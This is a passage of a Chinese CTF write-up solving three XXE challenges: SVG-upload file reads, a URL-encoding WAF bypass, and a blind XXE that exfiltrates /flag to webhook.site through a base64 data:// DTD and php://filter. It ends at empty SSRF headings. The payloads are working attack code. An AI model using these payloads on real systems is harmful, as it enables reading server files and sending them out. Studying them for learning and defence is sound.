+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">accept</span><span class="o">=</span><span class="s">&#34;.svg&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span><span class="p">&gt;</span>Analyze<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上传后服务端解析 SVG 并返回：尺寸、<code>&lt;desc&gt;</code> 标签内容等。</p>
+<p><strong>Step 2：构造恶意 SVG 文件</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE svg [
+</span></span><span class="line"><span class="cl">  &lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34;&gt;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl">&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;100&#34; height=&#34;100&#34;&gt;
+</span></span><span class="line"><span class="cl">  &lt;desc&gt;&amp;xxe;&lt;/desc&gt;
+</span></span><span class="line"><span class="cl">&lt;/svg&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>原理说明：</p>
+<ul>
+<li>SVG 是 XML 格式，支持 DOCTYPE 声明</li>
+<li>声明外部实体 <code>xxe</code> 引用 <code>file:///flag</code></li>
+<li>将实体放在 <code>&lt;desc&gt;</code> 标签中，服务端解析后会显示描述内容</li>
+</ul>
+<p><strong>Step 3：上传并获取 Flag</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -F <span class="s2">&#34;file=@evil.svg&#34;</span> <span class="s2">&#34;http://target/&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>服务端返回：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;result&#39;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>Analysis Result<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">strong</span><span class="p">&gt;</span>Dimensions:<span class="p">&lt;/</span><span class="nt">strong</span><span class="p">&gt;</span> 100 x 100<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">em</span><span class="p">&gt;</span>flag{f9583848-22b0-4855-95e2-c3c5a47b5c23}<span class="p">&lt;/</span><span class="nt">em</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Flag：</strong> <code>flag{f9583848-22b0-4855-95e2-c3c5a47b5c23}</code></p>
+<h3 id="ezxxe_2xxe--waf-关键词过滤绕过">EZXXE_2（XXE + WAF 关键词过滤绕过）
+</h3><p><strong>漏洞类型：</strong> XML 外部实体注入（XXE）+ WAF 绕过</p>
+<p><strong>题目分析：</strong></p>
+<p>与 EZXXE_1 同为 SVG 文件上传 XXE，但增加了 WAF 过滤：</p>
+<ul>
+<li><code>file://</code> 协议被过滤</li>
+<li><code>flag</code> 关键词被过滤（无论出现在路径的任何位置）</li>
+<li><code>php://</code>、<code>expect://</code>、<code>data://</code> 等协议被过滤</li>
+<li>直接路径（如 <code>/etc/passwd</code>）可以读取，但含 <code>flag</code> 的路径被拦截</li>
+</ul>
+<p><strong>过滤测试：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 被过滤的关键词
+</span></span><span class="line"><span class="cl">content=&lt;ENTITY xxe SYSTEM &#34;file:///flag&#34;&gt;    # ✗ file:// 被过滤
+</span></span><span class="line"><span class="cl">content=&lt;ENTITY xxe SYSTEM &#34;/flag&#34;&gt;           # ✗ flag 被过滤
+</span></span><span class="line"><span class="cl">content=&lt;ENTITY xxe SYSTEM &#34;/etc/passwd&#34;&gt;     # ✓ 可以读取
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>绕过思路：</strong> 使用 URL 编码绕过关键词检测。WAF 在检测前未对输入进行 URL 解码，因此可以用 <code>%67</code> 替代 <code>g</code> 来绕过 <code>flag</code> 关键词检测。</p>
+<p><strong>Step 1：确认过滤规则</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE svg [
+</span></span><span class="line"><span class="cl">  &lt;!ENTITY xxe SYSTEM &#34;/etc/passwd&#34;&gt;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl">&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;desc&gt;&amp;xxe;&lt;/desc&gt;&lt;/svg&gt;
+</span></span><span class="line"><span class="cl"># ✓ 可以读取，说明直接路径可用
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 2：URL 编码绕过</strong></p>
+<p><code>flag</code> 中的 <code>g</code> 编码为 <code>%67</code>，路径变为 <code>/fla%67</code>，WAF 无法识别但服务端会解码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE svg [
+</span></span><span class="line"><span class="cl">  &lt;!ENTITY xxe SYSTEM &#34;/fla%67&#34;&gt;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl">&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;desc&gt;&amp;xxe;&lt;/desc&gt;&lt;/svg&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 3：上传 SVG 获取 Flag</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -F <span class="s2">&#34;file=@evil.svg&#34;</span> <span class="s2">&#34;http://target/&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Flag：</strong> <code>flag{9e08d0c8-88a7-4ec0-b3e9-592f7bda2ea8}</code></p>
+<h3 id="ezxxe_3-盲-xxe--oob-外带">EZXXE_3 盲 XXE + OOB 外带
+</h3><p>这一题页面给了非常明显的提示：</p>
+<ul>
+<li>提交点是 <code>POST /xml.php</code></li>
+<li>支持 <code>DTD</code> 和外部实体</li>
+<li>解析结果不会回显文件内容，只会告诉我们 <code>OK</code> 或 <code>FAIL</code></li>
+<li>页面还直接提示了 “知道 flag 在根目录又如何”</li>
+</ul>
+<p>所以这题本质上就是一道盲 XXE。因为文件内容不直接回显到页面里，常规的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE root [
+</span></span><span class="line"><span class="cl">  &lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34;&gt;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl">&lt;root&gt;&amp;xxe;&lt;/root&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>虽然能被正常解析，但前端只会显示 <code>OK</code>，并不能直接看到 flag。</p>
+<p>先做一个基础验证，确认外部实体确实开启：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE root [
+</span></span><span class="line"><span class="cl">  &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl">&lt;root&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;&lt;b&gt;&lt;/b&gt;&lt;/root&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回 <code>OK</code>，说明本地文件实体会被解析。</p>
+<p>再构造一个不存在的文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE root [
+</span></span><span class="line"><span class="cl">  &lt;!ENTITY xxe SYSTEM &#34;file:///definitely_not_exists_123456&#34;&gt;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl">&lt;root&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;&lt;b&gt;&lt;/b&gt;&lt;/root&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这次返回 <code>FAIL</code>，说明页面上的 <code>OK/FAIL</code> 可以作为一个有效的盲测信号。随后把路径换成 <code>/flag</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE root [
+</span></span><span class="line"><span class="cl">  &lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34;&gt;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl">&lt;root&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;&lt;b&gt;&lt;/b&gt;&lt;/root&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>依旧返回 <code>OK</code>，由此确认根目录下的 <code>/flag</code> 确实存在。</p>
+<p>接下来就不能再靠页面回显了，得改成 OOB 外带。这里我用 <code>webhook.site</code> 接收请求，先创建一个 token，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl.exe -s -X POST https://webhook.site/token
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>会拿到一个类似下面的 token：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">7beb2df4-6f8d-4c37-9d6b-19e90de451ad
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这一步之后，先用一个最小 payload 测试目标机器是否真的能主动向外发请求：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE root [
+</span></span><span class="line"><span class="cl">  &lt;!ENTITY xxe SYSTEM &#34;http://webhook.site/7beb2df4-6f8d-4c37-9d6b-19e90de451ad?ping=http_entity&#34;&gt;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl">&lt;root&gt;&amp;xxe;&lt;/root&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查询 <code>webhook.site</code> 的请求记录后，可以看到目标服务器确实访问了这个 URL，说明 OOB 链路是通的。</p>
+<p>这一题还有一个很关键的点：<code>data://</code> 外部 DTD 也能被解析。这样我们就不需要单独找公网主机去托管 <code>evil.dtd</code>，可以直接把恶意 DTD base64 后塞进 <code>data://</code> 里，再由参数实体把 <code>/flag</code> 内容带到 <code>webhook.site</code>。</p>
+<p>最终使用的 payload 如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE root [
+</span></span><span class="line"><span class="cl">  &lt;!ENTITY % ext SYSTEM &#34;data://text/plain;base64,PCFFTlRJVFkgJSBmaWxlIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vZmxhZyI+CjwhRU5USVRZICUgZXZhbCAiPCFFTlRJVFkgJiN4MjU7IGV4ZmlsIFNZU1RFTSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvN2JlYjJkZjQtNmY4ZC00YzM3LTlkNmItMTllOTBkZTQ1MWFkP2Q9JWZpbGU7Jz4iPgolZXZhbDsKJWV4ZmlsOw==&#34;&gt;
+</span></span><span class="line"><span class="cl">  %ext;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl">&lt;root&gt;1&lt;/root&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这段 base64 解码后的 DTD 逻辑是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!ENTITY % file SYSTEM &#34;php://filter/convert.base64-encode/resource=/flag&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;https://webhook.site/7beb2df4-6f8d-4c37-9d6b-19e90de451ad?d=%file;&#39;&gt;&#34;&gt;
+</span></span><span class="line"><span class="cl">%eval;
+</span></span><span class="line"><span class="cl">%exfil;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>思路就是：</p>
+<ol>
+<li>用 <code>php://filter/convert.base64-encode/resource=/flag</code> 读取并编码 <code>/flag</code></li>
+<li>用参数实体再拼出一个新的外部实体 <code>%exfil</code></li>
+<li>让服务端主动请求 <code>https://webhook.site/...?...</code>，把 base64 形式的 flag 带出去</li>
+</ol>
+<p>最后在 <code>webhook.site</code> 请求记录里拿到：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ZmxhZ3tlYzQ3OGUyMy1mNjc5LTQwMDItODU0ZS1kMzRjOGU3Njg1NmJ9Cg==
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>base64 解码后得到最终 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{ec478e23-f679-4002-854e-d34c8e76856b}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="ezssrf">EZSSRF
 </h2><h3 id="ezssrf-1">EZSSRF
 </h3><h3 id="ezssrf_1">EZSSRF_1
 </h3><h3 id="ezssrf_2">EZSSRF_2
